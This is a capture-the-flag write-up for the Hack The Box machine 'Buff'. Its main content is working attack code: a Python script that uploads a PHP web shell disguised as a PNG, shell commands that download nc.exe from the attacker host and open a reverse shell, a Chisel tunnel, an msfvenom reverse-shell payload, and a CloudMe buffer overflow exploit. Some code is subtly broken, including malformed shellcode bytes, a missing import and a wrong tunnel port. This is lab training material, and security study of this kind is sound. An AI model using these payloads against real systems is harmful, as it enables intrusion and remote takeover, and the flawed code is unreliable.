
# HTB Buff Write-up

## Overview
Buff is a Windows machine with an easy difficulty level, running Gym Management System 1.0, which has an unauthenticated remote code execution vulnerability. After scanning the internal network, a service is discovered on port 8888. The installation file for this service is found on the disk, enabling local debugging. By setting up port forwarding, we can access the service remotely and exploit the vulnerability.

## Enumeration

```bash
nmap -sC -sV 10.10.10.198 -oA nmap -Pn
```

**Results:**

```
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
```

Visiting the site, I found out that it is using Gym Management Software 1.0, which suffers from an unauthenticated file upload vulnerability that can lead to Remote Code Execution (RCE).

From the website of Gym Management Software, we can download the source code and check for the `upload.php`.

## Exploitation

Using a simple Python script, we can upload a shell.

### Python Script:

```python
#!/usr/bin/env python3
import requests

def Main():
    url = "http://10.10.10.198:8080/upload.php?id=test"
    s = requests.Session()
    s.get(url, verify=False)

    PNG_magicBytes = '\x89\x50\x4e\x47\x0d\x0a\x1a'
    png = {
        'file': (
            'test.php.png',
            PNG_magicBytes + '\n' + '<?php echo shell_exec($_GET["cmd"]); ?>',
            'image/png',
            {'Content-Disposition': 'form-data'}
        )
    }

    data = {'pupload': 'upload'}
    
    # Send the POST request to upload the file
    r = s.post(url=url, files=png, data=data, verify=False)
    print("Uploaded!")

if __name__ == "__main__":
    Main()
```

### Code Explanation

1. **Purpose of the Script:**
   The script is designed to exploit a file upload vulnerability on a web application running on `http://10.10.10.198:8080/upload.php`. It uploads a web shell disguised as a PNG image, allowing the attacker to execute commands remotely via the `cmd` parameter in the web shell.

2. **Key Components:**

   - **PNG_magicBytes:**
     PNG files start with specific magic bytes to indicate that they are valid PNG files. This script includes these bytes (`\x89\x50\x4e\x47\x0d\x0a\x1a`) at the start of the uploaded file to fool the application into thinking the file is a real PNG image.

   - **Web Shell Content:**
     The PHP code in the file being uploaded:
     ```php
     <?php echo shell_exec($_GET["cmd"]); ?>
     ```
     This code executes any command provided through the `cmd` parameter in the URL. For example:
     ```
     http://10.10.10.198:8080/upload/test.php?cmd=whoami
     ```
     would execute the `whoami` command on the server.

   - **Upload Request:**
     The script creates a fake "image" with the required PNG magic bytes and the PHP web shell:
     ```python
     PNG_magicBytes + '\n' + '<?php echo shell_exec($_GET["cmd"]); ?>'
     ```
     The file is sent to the server using a POST request:
     ```python
     r = s.post(url=url, files=png, data=data, verify=False)
     ```

   - **Accessing the Web Shell:**
     Once uploaded, the web shell will be available at:
     ```
     http://10.10.10.198:8080/upload/test.php
     ```
     Commands can be executed by appending them as the `cmd` parameter:
     ```
     http://10.10.10.198:8080/upload/test.php?cmd=<COMMAND>
     ```

     Use Burp Suite to execute this (URL encode):
     ```
     http://10.10.10.198:8080/upload/test.php?cmd=Powershell Invoke-WebRequest -Uri http://10.10.14.6:80/nc.exe -Outfile /users/public/nc.exe
     ```

     Execute the `nc.exe`:
     ```
     http://10.10.10.198:8080/upload/test.php?cmd=/users/public/nc.exe 10.10.14.6 9000 -e cmd.exe
     ```

## Privilege Escalation

The server is communicating with port 8888.

1. **Use Chisel to tunnel communication into the attacker's machine:**

   - [Chisel GitHub](https://github.com/jpillora/chisel)
   
   Upload `chisel.exe` to the victim's machine.

2. **Setup a listening server on the attacker's machine:**

   ```bash
   ./chisel server -p 9999 --reverse
   ```

3. **Listen to the server on the victim's side:**

   ```bash
   chisel.exe client 10.10.14.6:9999 R:8888:127.0.0.1:888
   ```

Once the tunnel is created, craft the buffer overflow exploit.

### Install ExploitDB:

```bash
sudo apt update && sudo apt -y install exploitdb
```

Search for the exploit:

```bash
searchsploit cloudme
```

Found: `CloudMe 1.11.2 - Buffer Overflow (PoC)`  
Location: `windows/remote/48389.py`

```bash
└──╼ [★]$ find / 2>/dev/null | grep 48389.py
/usr/share/exploitdb/exploits/windows/remote/48389.py
```

Copy to `HTB/Buff`:

```bash
cp /usr/share/exploitdb/exploits/windows/remote/48389.py ~/HTB/Buff/exploit.py
```

Now, craft the payload using `msfvenom`:

```bash
msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.14.6 LPORT=9001 EXITFUNC=thread -b "\x00\x0A\x0D" -f python
```

Put the payload in `exploit.py`:

```python
# Exploit Title: CloudMe 1.11.2 - Buffer Overflow (PoC)
# Date: 2020-04-27
# Exploit Author: Andy Bowden
# Vendor Homepage: https://www.cloudme.com/en
# Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe
# Version: CloudMe 1.11.2
# Tested on: Windows 10 x86

import socket
target = "127.0.0.1"
padding1   = b"\x90" * 1052
EIP        = b"\xB5\x42\xA8\x68" # 0x68A842B5 -> PUSH ESP, RET
NOPS       = b"\x90" * 30
buf =  b""
buf += b"\xdb\xd7\xd9\x74\x24xf4\xbd\x8e\xc1\x90\xf2\x58"
buf += b"\x31xc9\xb1\x52\x31\x68\x17\x03\x68\x17\x83\x4e"
buf += b"\xc5\x72\x07\xb2\x2e\xf0\xe8\x4a\xaf\x95\x61\xaf"
# More shellcode here...
payload = buf
overrun    = b"C" * (1500 - len(padding1 + NOPS + EIP + payload))
buf = padding1 + EIP + NOPS + payload + overrun
try:
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,8888))
    s.send(buf)
except Exception as e:
    print(sys.exc_value)
```

### Setup a Listener on Port 9001
```bash
nc -lnvp 9001
```

### Run the exploit:

```bash
python exploit.py
```
